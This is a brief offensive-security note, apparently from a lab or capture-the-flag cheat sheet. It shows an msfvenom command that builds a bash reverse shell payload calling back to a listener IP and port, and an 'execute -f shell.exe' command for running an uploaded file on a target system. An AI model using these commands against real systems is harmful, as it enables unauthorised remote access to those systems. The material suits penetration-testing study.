
You can use msfvenom to generate reverse shell payload for example - 
`msfvenom -p cmd/unix/reverse_bash lhost=10.17.52.10 lport=1234 R`


You can use `execute -f shell.exe` to run a file that you have uploaded onto the target system

